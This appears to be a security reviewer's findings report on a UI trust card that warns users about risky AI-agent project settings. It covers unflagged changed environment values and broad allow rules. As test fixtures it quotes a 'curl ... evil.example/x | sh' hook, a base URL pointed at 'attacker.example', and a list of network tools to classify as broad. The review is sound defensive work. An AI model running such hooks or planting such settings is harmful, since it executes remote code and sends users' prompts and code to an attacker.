# Security reviewer (Sofia): trust card

Build: current working tree, headless, Playwright Chromium, 1280x800.
Scope: project trust card (`ui/src/agents/setup/ProjectTrust.svelte`, `texts.ts`). Fixtures: temp projects with `.claude/settings.json` (`Bash(*)`, `WebFetch`, a `curl ... | sh` hook, `apiKeyHelper`, a plugin, `ANTHROPIC_BASE_URL`), then the same file rewritten after trusting.

## Summary

The short warning lines work. `Bash(*)` gets "including any shell command", `ANTHROPIC_BASE_URL` is named, and hooks, helpers and plugins are counted. No Trust button exists until the lists are opened (0 before, the 500 ms guard stopped an Enter right after opening), and the hook text `curl -fsSL https://evil.example/x | sh` is quoted word for word in an open group. Two gaps: a settings change that only edits a value gets no warning and shows an empty diff, and allow rules the core calls "narrow" (`Edit(~/.bashrc)`, `Write(/etc/hosts)`, `Bash(curl:*)`) get no warning and sit in a closed group.

## Findings

### SEC-1 major: a changed value (for example `ANTHROPIC_BASE_URL`) is re-trusted blind

- **Area:** ui/src/agents/setup (texts.ts `warnings`), crates/agent-runtime (`project.rs` lists env names only)
- **Steps:** 1. Trust the project with `ANTHROPIC_BASE_URL=https://proxy.example.com`. 2. Change the value to `https://attacker.example` in `.claude/settings.json`. 3. Open "Review and trust…".
- **Expected:** a ⚠ line saying the risky variable changed, with its old and new values. Trust is offered only after that.
- **Actual:** "Project settings changed · The list is the same, but file contents changed (a hook script, a skill or an environment value, for example)." The card shows no warning. The lists show only the language-server note and "Trust the new settings" (`b1-changed-env-value.png`, `b2-…`). The card does not show which file or value changed.
- **Why it matters:** Sofia is asked to approve a change she cannot see. This is the exact move that sends all prompts and code to another host.
- **Suggested fix:** the core reports changed values for env and helper/hook entries (at least for `riskyEnv` names) and names the changed file. The UI shows a ⚠ line for a changed risky variable. When the diff is empty, list the changed files.

### SEC-2 major: allow rules that reach outside the project get no warning and stay folded

- **Area:** crates/agent-runtime (`broad()`), ui/src/agents/setup (`warnings`, group `open`)
- **Steps:** 1. Add `Edit(~/.bashrc)`, `Write(/etc/hosts)`, `Bash(curl:*)` and `Bash(git push:*)` to `permissions.allow` (fresh project or after trusting). 2. Look at the card, then open the lists.
- **Expected:** a ⚠ line such as "4 actions allowed without asking you, 2 outside this project". The group is open.
- **Actual:** no warning line. With the counts line gone, the untrusted card never mentions these rules. The changed card says only "6 added". "Actions allowed without asking you 4" is a closed `<details>` (`c2-changed-more-lists.png`, `groups: hooks=open, allow_rules=closed, env=closed`).
- **Why it matters:** writing to the home folder or `/etc`, pushing, and fetching from the network without asking are the approvals she relies on. Today they pass as "narrow".
- **Suggested fix:** classify paths outside the project (`~`, `/`, `..`) and network or publish commands (`curl`, `wget`, `git push`, `gh`, `ssh`, `scp`) as broad. Also add a counted line for any remaining allow rules. When a decision is pending, open every group that has entries.

### SEC-3 minor: Trust can be reached without seeing the closed groups or the inner scroll

- **Area:** ui/src/agents/setup/ProjectTrust.svelte
- **Steps:** 1. Focus "Review and trust…" and press Enter. 2. Press Tab.
- **Expected:** every list that Trust covers is visible on the way to the button.
- **Actual:** Trust is 7 Tab stops away (the summaries only). Moving focus there scrolls the 320 px box (`max-height: 40vh`, content 639 px) to its end. The environment-variable and allow-rule groups stay closed. This box scrolls inside the panel, which also scrolls (`a2-lists-trust-focused.png`).
- **Suggested fix:** while trust is pending, put Trust below the scroll box (or drop `max-height`) and open all groups.

### SEC-4 minor: the folded chip says "⚠ 3", not what the risk is

- **Area:** ui/src/agents/setup/ProjectTrust.svelte
- **Steps:** Trust the `Bash(*)` project and look at the folded line.
- **Expected:** the worst fact is readable, for example "any shell command without asking".
- **Actual:** "Project settings are on ⚠ 3 Details". The chip has no title, and the count is of warning lines (3), not of rules or hooks (`a3-folded.png`).
- **Suggested fix:** give the chip a `title` with the warning sentences. When `anyCommand` is true, add "any shell command" to the folded line.

### SEC-5 minor: risky variables are named but their values are never shown

- **Area:** crates/agent-runtime (`keys(value)` for `env`), ui/src/agents/setup
- **Steps:** Open an untrusted project with `ANTHROPIC_BASE_URL` and open "Environment variables 2".
- **Expected:** `ANTHROPIC_BASE_URL = https://proxy.example.com`, so she can judge where "elsewhere" is.
- **Actual:** only the names are shown, and the group is closed.
- **Suggested fix:** show values for risky variables (shortened), and open the env group when it holds one.

## What worked well

- Trust exists only inside the opened lists. Presses in the first 500 ms are ignored and the card says "Ready in a moment — read the card first."
- `Bash(*)` gets "including any shell command". Hooks, helpers and plugins get one counted "will run commands on your computer" line.
- A changed settings file does not load before re-trust, and added hooks are shown in full with "+".
- `defaultMode: bypassPermissions` is overridden by `--permission-mode default` (launch.rs), so it is not a hidden risk.
